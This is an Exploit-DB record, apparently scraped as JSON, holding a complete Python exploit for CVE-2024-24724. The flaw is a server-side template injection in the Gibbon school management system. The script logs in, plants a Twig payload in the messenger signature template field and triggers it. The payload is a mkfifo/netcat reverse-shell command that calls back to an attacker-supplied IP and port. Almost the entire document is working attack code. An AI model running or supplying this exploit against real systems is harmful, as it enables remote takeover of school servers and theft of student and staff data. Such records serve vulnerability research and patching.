{"source": "https://www.exploit-db.com/exploits/51962", "vulnName": "Gibbon LMS v26.0.00 - SSTI vulnerability", "vulnEDBID": "51962", "vulnCVE": "2024-24724", "author": "ALI MAHARRAMLI,FIKRAT GULIEV,ISLAM RZAYEV", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-04-02", "vulnContent": "# Exploit Title: Gibbon LMS v26.0.00 - SSTI vulnerability\n# Date: 21.01.2024\n# Exploit Author: SecondX.io Research Team(Islam Rzayev,Fikrat Guliev, Ali Maharramli)\n# Vendor Homepage: https://gibbonedu.org/\n# Software Link: https://github.com/GibbonEdu/core\n# Version: v26.0.00\n# Tested on: Ubuntu 22.0\n# CVE : CVE-2024-24724\n\nimport requests\nimport re\nimport sys\n\n\ndef login(target_host, target_port,email,password):\n     url = f'http://{target_host}:{target_port}/login.php?timeout=true'\n     headers = {\"Content-Type\": \"multipart/form-data; \nboundary=---------------------------174475955731268836341556039466\"}\n     data = \nf\"-----------------------------174475955731268836341556039466\\r\\nContent-Disposition: \nform-data; \nname=\\\"address\\\"\\r\\n\\r\\n\\r\\n-----------------------------174475955731268836341556039466\\r\\nContent-Disposition: \nform-data; \nname=\\\"method\\\"\\r\\n\\r\\ndefault\\r\\n-----------------------------174475955731268836341556039466\\r\\nContent-Disposition: \nform-data; \nname=\\\"username\\\"\\r\\n\\r\\n{email}\\r\\n-----------------------------174475955731268836341556039466\\r\\nContent-Disposition: \nform-data; \nname=\\\"password\\\"\\r\\n\\r\\n{password}\\r\\n-----------------------------174475955731268836341556039466\\r\\nContent-Disposition: \nform-data; \nname=\\\"gibbonSchoolYearID\\\"\\r\\n\\r\\n025\\r\\n-----------------------------174475955731268836341556039466\\r\\nContent-Disposition: \nform-data; \nname=\\\"gibboni18nID\\\"\\r\\n\\r\\n0002\\r\\n-----------------------------174475955731268836341556039466--\\r\\n\"\n     r = requests.post(url, headers=headers, data=data, \nallow_redirects=False)\n     Session_Cookie = re.split(r\"\\s+\", r.headers['Set-Cookie'])\n     if Session_Cookie[4] is not None and '/index.php' in \nstr(r.headers['Location']):\n         print(\"login successful!\")\n\n     return Session_Cookie[4]\n\n\n\ndef rce(cookie, target_host, target_port, attacker_ip, attacker_port):\n     url = \nf'http://{target_host}:{target_port}/modules/School%20Admin/messengerSettingsProcess.php'\n     headers = {\"Content-Type\": \"multipart/form-data; \nboundary=---------------------------67142646631840027692410521651\", \n\"Cookie\": cookie}\n     data = \nf\"-----------------------------67142646631840027692410521651\\r\\nContent-Disposition: \nform-data; name=\\\"address\\\"\\r\\n\\r\\n/modules/School \nAdmin/messengerSettings.php\\r\\n-----------------------------67142646631840027692410521651\\r\\nContent-Disposition: \nform-data; \nname=\\\"enableHomeScreenWidget\\\"\\r\\n\\r\\nY\\r\\n-----------------------------67142646631840027692410521651\\r\\nContent-Disposition: \nform-data; name=\\\"signatureTemplate\\\"\\r\\n\\r\\n{{{{[\\'rm /tmp/f;mkfifo \n/tmp/f;cat /tmp/f|sh -i 2>&1|nc {attacker_ip} {attacker_port} \n >/tmp/f']|filter('system')}}}}\\r\\n-----------------------------67142646631840027692410521651\\r\\nContent-Disposition: form-data; name=\\\"messageBcc\\\"\\r\\n\\r\\n\\r\\n-----------------------------67142646631840027692410521651\\r\\nContent-Disposition: form-data; name=\\\"pinnedMessagesOnHome\\\"\\r\\n\\r\\nN\\r\\n-----------------------------67142646631840027692410521651--\\r\\n\"\n     r = requests.post(url, headers=headers, data=data, \nallow_redirects=False)\n     if 'success0' in str(r.headers['Location']):\n         print(\"Payload uploaded successfully!\")\n\n\n\ndef trigger(cookie, target_host, target_port):\n     url = \nf'http://{target_host}:{target_port}/index.php?q=/modules/School%20Admin/messengerSettings.php&return=success0'\n     headers = {\"Cookie\": cookie}\n     print(\"RCE successful!\")\n     r = requests.get(url, headers=headers, allow_redirects=False)\n\n\nif __name__ == '__main__':\n     if len(sys.argv) != 7:\n         print(\"Usage: script.py <target_host> <target_port> \n<attacker_ip> <attacker_port> <email> <password>\")\n         sys.exit(1)\n     cookie = login(sys.argv[1], sys.argv[2],sys.argv[5],sys.argv[6])\n     rce(cookie, sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])\n     trigger(cookie, sys.argv[1], sys.argv[2])\n            "}